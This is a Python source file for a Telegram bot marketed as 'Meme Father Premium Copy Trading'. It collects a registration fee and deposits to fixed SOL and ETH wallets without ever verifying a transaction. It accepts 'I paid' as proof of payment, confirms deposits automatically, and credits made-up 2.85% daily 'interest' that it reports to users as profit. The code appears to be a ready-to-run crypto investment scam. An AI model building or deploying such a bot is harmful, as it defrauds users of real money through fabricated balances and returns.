import os
import time
import asyncio
import nest_asyncio
import requests
import logging
import httpx
import matplotlib.pyplot as plt
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.error import TimedOut
from dotenv import load_dotenv

# Configure logging for production (INFO level to reduce debug output).
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Patch asyncio to allow nested event loops.
nest_asyncio.apply()

# Load environment variables.
load_dotenv()
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT")
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT token not found in environment!")

# Email configuration for support queries.
SUPPORT_EMAIL = "ccommodoreofboard@gmail.com"
SUPPORT_EMAIL_USER = os.getenv("SUPPORT_EMAIL_USER")
SUPPORT_EMAIL_PASSWORD = os.getenv("SUPPORT_EMAIL_PASSWORD")
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Constants for wallet addresses.
PREMIUM_SOL_WALLET = "Au3amLeXRnAsPx6UxMscEi2Q5JZmdkBghycSz1f5ivh"
DEPOSIT_SOL_WALLET = "6RDXuY6aaREBsb9nWJrqh7eqjwHDLcUz2AUkUhfCsMRR"
ETH_WALLET = "0x4348409d1D959680b315DA798FEf5C3b6C64cdBB"

# Define conversation states.
(ONBOARD, ONBOARD_USERNAME, PAYMENT_CONFIRMATION, INVEST_CHOICE, T_AND_C, DEPOSIT_AMOUNT) = range(6)

# Global dictionary to store user finances and onboarding info.
user_finances = {}

# --- Global Error Handler ---
async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        raise context.error
    except TimedOut as e:
        logger.error(f"Timeout error occurred: {e}")
    except Exception as e:
        logger.error(f"Unhandled error: {e}")

# Helper function to check if a user is fully onboarded.
async def check_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    chat_id = update.effective_chat.id
    if chat_id not in user_finances or not user_finances[chat_id].get("registration_fee_paid", False):
        await update.message.reply_text("❗ You must complete onboarding and pay the registration fee to use this command.")
        return False
    return True

# --- Onboarding Conversation Handlers ---
async def onboard_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.effective_chat.id
    if chat_id in user_finances and user_finances[chat_id].get("registration_fee_paid", False):
        await update.message.reply_text("You are already onboarded.")
        return ConversationHandler.END
    text = (
        "👋 **Welcome to Meme Father Premium Copy Trading!**\n\n"
        "Would you like to onboard for premium access? *(yes/no)*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    return ONBOARD

async def onboard_response(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    response = update.message.text.strip().lower()
    if response not in ["yes", "no"]:
        await update.message.reply_text("Invalid input. Please reply with *yes* or *no*.", parse_mode="Markdown")
        return ONBOARD
    if response == "yes":
        await update.message.reply_text("Great! Please enter your **username** for registration:", parse_mode="Markdown")
        return ONBOARD_USERNAME
    else:
        try:
            r = requests.get("https://api.dexscreener.com/token-boosts/top/v1", timeout=10)
            data = r.json()
            if isinstance(data, dict):
                tokens = data.get("data", [])
            elif isinstance(data, list):
                tokens = data
            else:
                tokens = []
            tokens = tokens[:3]
            tokens_info = "\n".join([f"- {token.get('name', 'Unknown')}: ${float(token.get('price', 0)):.2f}" for token in tokens])
            update_msg = (
                "📈 **DEXscanner Market Data:**\n"
                f"{tokens_info}\n\n"
                "Thank you for using **Sense Bot Free Version**!"
            )
        except Exception as e:
            update_msg = f"Error fetching market data: {e}"
        await update.message.reply_text(update_msg, parse_mode="Markdown")
        return ConversationHandler.END

async def onboard_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    username = update.message.text.strip()
    if not username:
        await update.message.reply_text("Invalid username. Please enter a non-empty username.", parse_mode="Markdown")
        return ONBOARD_USERNAME
    if len(username) < 3:
        await update.message.reply_text("Username too short. Please enter a valid username.", parse_mode="Markdown")
        return ONBOARD_USERNAME
    context.user_data["username"] = username
    verification_text = f"✅ Your username **{username}** has been verified successfully!"
    await update.message.reply_text(verification_text, parse_mode="Markdown")
    
    # Instantiate registration payment request:
    registration_payment_text = (
        "To complete your premium onboarding, please pay the **Premium Access Fee** using one of the following options:\n\n"
        "- **2 SOL** to our Premium SOL wallet: `{}`\n\n"
        "- **0.013 ETH** to our Premium ETH wallet: `{}`\n\n"
        "Once you have made the payment, please type **I paid** to confirm. Payment confirmation may take up to 5 minutes."
        .format(PREMIUM_SOL_WALLET, ETH_WALLET)
    )
    await update.message.reply_text(registration_payment_text, parse_mode="Markdown")
    return PAYMENT_CONFIRMATION

async def payment_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message.text.strip().lower() == "i paid":
        # Mark registration fee as paid in user_data temporarily
        context.user_data["registration_fee_paid"] = True
        await update.message.reply_text(
            "✅ Payment received for registration. Please wait 5 minutes for full confirmation.\n\n"
            "Now, would you like to handle your *INVESTMENT*? *(yes/no)*",
            parse_mode="Markdown"
        )
        return INVEST_CHOICE
    else:
        await update.message.reply_text("⚠️ To confirm your payment, please type **I paid**.", parse_mode="Markdown")
        return PAYMENT_CONFIRMATION

async def invest_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    response = update.message.text.strip().lower()
    if response not in ["yes", "no"]:
        await update.message.reply_text("Invalid input. Please reply with *yes* or *no*.", parse_mode="Markdown")
        return INVEST_CHOICE
    context.user_data["invest_choice"] = (response == "yes")
    if response == "yes":
        t_and_c_text = (
            "📜 **Terms and Conditions**\n\n"
            "1. Premium Membership Agreement: By engaging with our services, you acknowledge and accept our premium terms, which may be subject to periodic updates.\n\n"
            "2. Profit-Sharing Commission: A **2% commission** will be deducted from the net profits of all successful trades executed using our platform.\n\n"
            "3. Transaction Transparency: All transactions are recorded for compliance and auditing purposes.\n\n"
            "4. Risk Acknowledgment: Trading involves inherent financial risks. You assume full responsibility for your decisions.\n\n"
            "5. Regulatory Compliance: You confirm compliance with all applicable financial regulations.\n\n"
            "6. Data Protection: Your personal data is handled securely in line with our Privacy Policy.\n\n"
            "Please type **I accept** to acknowledge and continue."
        )
        await update.message.reply_text(t_and_c_text, parse_mode="Markdown")
        return T_AND_C
    else:
        await update.message.reply_text("Alright. Please enter the **amount you plan to deposit** (in SOL):", parse_mode="Markdown")
        return DEPOSIT_AMOUNT

async def t_and_c(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    response = update.message.text.strip().lower()
    if response != "i accept":
        await update.message.reply_text("Invalid input. You must acknowledge the terms by typing **I accept**.", parse_mode="Markdown")
        return T_AND_C
    context.user_data["t_and_c_accepted"] = True
    await update.message.reply_text("Thank you. Now, please enter the **amount you plan to deposit** (in SOL):", parse_mode="Markdown")
    return DEPOSIT_AMOUNT

# --- Deposit Amount Handler ---
async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        amount = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("⚠️ Deposit amount must be a valid number. Please try again:", parse_mode="Markdown")
        return DEPOSIT_AMOUNT
    chat_id = update.effective_chat.id
    current_time = time.time()
    if chat_id not in user_finances:
        user_finances[chat_id] = {}
    user_finances[chat_id].update({
        "onboarded": True,
        "username": context.user_data.get("username", ""),
        "registration_fee_paid": True,
        "invest_choice": context.user_data.get("invest_choice", False),
        "t_and_c_accepted": context.user_data.get("t_and_c_accepted", False),
        "total_deposit": user_finances[chat_id].get("total_deposit", 0.0) + amount,
        "investment": user_finances[chat_id].get("investment", 0.0) + amount,
        "pending_deposit": amount,
        "pending_deposit_time": current_time,
        "profit": user_finances[chat_id].get("profit", 0.0),
        "history": user_finances[chat_id].get("history", [])
    })
    record = f"{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(current_time))}: ONBOARD - Registered with username {context.user_data.get('username', '')}; Deposit of {amount:.4f} SOL is pending confirmation."
    user_finances[chat_id]["history"].append(record)
    await update.message.reply_text(
        "✅ Your deposit of **{:.4f} SOL** has been recorded as pending.\n"
        "Please send your funds to the deposit wallet: **{}**.\n\n"
        "After sending the funds, please type **confirm payment** to finalize your deposit.\n"
        "If you do not confirm manually, your deposit will be automatically confirmed after 30 minutes."
        .format(amount, DEPOSIT_SOL_WALLET),
        parse_mode="Markdown"
    )
    # Schedule deposit confirmation job to run in 30 minutes (1800 seconds)
    context.job_queue.run_once(confirm_deposit, 1800, data=chat_id)
    # Schedule an automated message to prompt the user after 10 minutes (600 seconds)
    context.job_queue.run_once(reminder_check_transaction, 600, data=chat_id)
    return ConversationHandler.END

# --- New Deposit Payment Confirmation Handler ---
async def deposit_payment_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id in user_finances and user_finances[chat_id].get("pending_deposit", 0.0) > 0:
        pending = user_finances[chat_id].get("pending_deposit")
        user_data = user_finances[chat_id]
        user_data["investment"] += pending
        user_data["total_deposit"] += pending
        user_data["pending_deposit"] = 0.0
        user_data["pending_deposit_time"] = None
        if user_data["history"]:
            last_record = user_data["history"][-1]
            if "(pending)" in last_record.lower():
                user_data["history"][-1] = last_record.replace("pending", "confirmed")
        await update.message.reply_text("✅ Your deposit has been confirmed and added to your investment balance.", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ No pending deposit found to confirm.", parse_mode="Markdown")

# --- Confirm Deposit Job (modified for 30 minutes delay) ---
async def confirm_deposit(context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = context.job.data
    if chat_id in user_finances:
        pending = user_finances[chat_id].get("pending_deposit", 0.0)
        if pending > 0:
            user_data = user_finances[chat_id]
            user_data["investment"] += pending
            user_data["total_deposit"] += pending
            user_data["pending_deposit"] = 0.0
            user_data["pending_deposit_time"] = None
            if user_data["history"]:
                last_record = user_data["history"][-1]
                if "(pending)" in last_record.lower():
                    user_data["history"][-1] = last_record.replace("pending", "confirmed")
            await context.bot.send_message(chat_id=chat_id, text="✅ Your deposit has been added to your investment balance.", parse_mode="Markdown")

# --- Reminder Job Function ---
async def reminder_check_transaction(context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = context.job.data
    await context.bot.send_message(
        chat_id=chat_id,
        text="⏰ Reminder: Please check your transaction status for deposit confirmation."
    )

# --- Deposit Command Handler (for deposits via /deposit command) ---
async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("💡 Usage: /deposit <amount>", parse_mode="Markdown")
        return
    try:
        amount = float(args[0])
    except ValueError:
        await update.message.reply_text("⚠️ Deposit amount must be a valid number.", parse_mode="Markdown")
        return
    chat_id = update.effective_chat.id
    current_time = time.time()
    user_data = user_finances[chat_id]
    user_data["pending_deposit"] = user_data.get("pending_deposit", 0.0) + amount
    user_data["pending_deposit_time"] = current_time
    record = f"{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(current_time))}: DEPOSIT {amount:.4f} SOL (pending)"
    user_data["history"].append(record)
    await update.message.reply_text(
        f"💰 *Deposit successful.* {record}\n"
        f"Please send your deposit to the wallet: **{DEPOSIT_SOL_WALLET}**.\n\n"
        "After sending the funds, please type **confirm payment** to finalize your deposit.\n"
        "If you do not confirm manually, your deposit will be automatically confirmed after 30 minutes.",
        parse_mode="Markdown"
    )
    context.job_queue.run_once(confirm_deposit, 1800, data=chat_id)
    context.job_queue.run_once(reminder_check_transaction, 600, data=chat_id)

# --- Cancel Onboarding Handler ---
async def cancel_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Onboarding cancelled. Use /start to try again.")
    return ConversationHandler.END

# --- Additional Bot Commands ---
async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    if context.args:
        query = " ".join(context.args)
    else:
        await update.message.reply_text("Please type your support query after the command. Example: /support I have an issue with my deposit.")
        return
    sender_info = update.effective_user.username or str(update.effective_user.id)
    subject = f"Support Query from Telegram Bot User: {sender_info}"
    body = f"User: {sender_info}\nQuery: {query}"
    message = MIMEMultipart()
    message['From'] = SUPPORT_EMAIL_USER
    message['To'] = SUPPORT_EMAIL
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SUPPORT_EMAIL_USER, SUPPORT_EMAIL_PASSWORD)
        server.sendmail(SUPPORT_EMAIL_USER, SUPPORT_EMAIL, message.as_string())
        server.quit()
        await update.message.reply_text("✅ Your support query has been sent. We will get back to you shortly.")
    except Exception as e:
        logger.error(f"Error sending support email: {e}")
        await update.message.reply_text("⚠️ There was an error sending your support query. Please try again later.")

async def solwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    text = f"💰 **SOL Wallet Address:**\n`{PREMIUM_SOL_WALLET}`"
    await update.message.reply_text(text, parse_mode="Markdown")

async def ethwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    text = f"💰 **ETH Wallet Address:**\n`{ETH_WALLET}`"
    await update.message.reply_text(text, parse_mode="Markdown")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    chat_id = update.effective_chat.id
    data = user_finances[chat_id]
    pending_time = data.get("pending_deposit_time")
    if pending_time and (time.time() - pending_time) < 1800:
        history_text = "No transactions recorded yet."
    else:
        history_text = "\n".join(data["history"]) if data["history"] else "No transactions recorded yet."
    summary_text = (
        f"📊 *Investment Summary:*\n"
        f"**Total Deposited:** {data['investment']:.4f} SOL\n"
        f"**PNL:** {data['profit']:.4f} SOL\n\n"
        f"📝 *Transaction History:*\n{history_text}"
    )
    await update.message.reply_text(summary_text, parse_mode="Markdown")
    labels = ['Investment', 'Profit']
    values = [data['investment'], data['profit']]
    plt.figure(figsize=(4, 3))
    plt.bar(labels, values, color=['blue', 'green'])
    plt.title('Performance Overview')
    plt.tight_layout()
    plt.savefig("performance.png")
    plt.close()
    with open("performance.png", "rb") as photo_file:
        await update.message.reply_photo(photo=photo_file)
    os.remove("performance.png")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "💡 *Commands:*\n"
        "/start - Onboard for premium access\n"
        "/deposit <amount> - Deposit additional funds\n"
        "/status - View your investment report and performance graphics\n"
        "/support <query> - Send a support query\n"
        "/solwallet - Display the SOL wallet address\n"
        "/ethwallet - Display the ETH wallet address\n"
        "/help - Show this help message\n"
        "/chat - Talk to the finance bot"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

# --- Finance Chat Handler ---
async def chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text.strip().lower()
    if "hello" in text or "hi" in text:
        response = "Hello! How can I assist you with your finances today?"
    elif "market" in text:
        response = "The market is always fluctuating. Keep an eye on your investments and consider diversification."
    elif "investment" in text:
        response = "Investing wisely involves both research and risk management. How can I help you with your investment queries?"
    else:
        response = "I'm here to help with your finance-related questions. Feel free to ask me anything about markets, investments, or strategies!"
    await update.message.reply_text(response, parse_mode="Markdown")

# --- Daily Interest Accrual Job ---
async def daily_interest_accrual(context: ContextTypes.DEFAULT_TYPE) -> None:
    for chat_id, user_data in user_finances.items():
        if user_data.get("registration_fee_paid", False) and user_data.get("total_deposit", 0) > 0:
            interest = user_data["total_deposit"] * 0.0285
            user_data["investment"] += interest
            user_data["profit"] += interest
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(time.time()))
            user_data["history"].append(f"{timestamp}: DAILY INTEREST +{interest:.4f} SOL added.")
            try:
                await context.bot.send_message(chat_id=chat_id, text=f"✅ Daily interest of {interest:.4f} SOL has been added to your account.")
            except Exception as e:
                logger.error(f"Error sending daily interest notification to {chat_id}: {e}")

# --- Main Function to Run the Telegram Bot ---
async def run_telegram_bot():
    custom_timeout = httpx.Timeout(connect=30.0, read=30.0, write=30.0, pool=30.0)
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    try:
        application.bot._request._client.timeout = custom_timeout
        logger.info("Patched HTTPX client timeout successfully.")
    except Exception as e:
        logger.error(f"Could not patch HTTPX client timeout: {e}")
    
    application.add_error_handler(global_error_handler)
    
    onboard_conv = ConversationHandler(
        entry_points=[CommandHandler("start", onboard_start)],
        states={
            ONBOARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, onboard_response)],
            ONBOARD_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, onboard_username)],
            PAYMENT_CONFIRMATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, payment_confirmation)],
            INVEST_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, invest_choice)],
            T_AND_C: [MessageHandler(filters.TEXT & ~filters.COMMAND, t_and_c)],
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)]
        },
        fallbacks=[CommandHandler("cancel", cancel_onboarding)]
    )
    application.add_handler(onboard_conv)
    
    application.add_handler(CommandHandler("deposit", deposit_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("support", support_command))
    application.add_handler(CommandHandler("solwallet", solwallet_command))
    application.add_handler(CommandHandler("ethwallet", ethwallet_command))
    
    # Command to trigger the chat handler
    application.add_handler(CommandHandler("chat", chat_handler))
    # Fallback: handle regular text messages as finance chat if they don't match any command.
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat_handler))
    
    # Handler for manual deposit confirmation
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^confirm payment$"), deposit_payment_confirmation))
    
    # Schedule the daily interest accrual job to run every 24 hours (86400 seconds)
    application.job_queue.run_repeating(daily_interest_accrual, interval=86400, first=86400)
    
    await application.run_polling()

# --- Cloud Functions Entry Point ---
def run_telegram_bot_entry(request):
    """
    This is the Cloud Functions HTTP entry point.
    When an HTTP request is received, it triggers the bot.
    """
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_telegram_bot())
        return "Bot started", 200
    except Exception as e:
        logger.error(f"Error starting bot: {e}")
        return f"Error: {e}", 500

if __name__ == "__main__":
    asyncio.run(run_telegram_bot())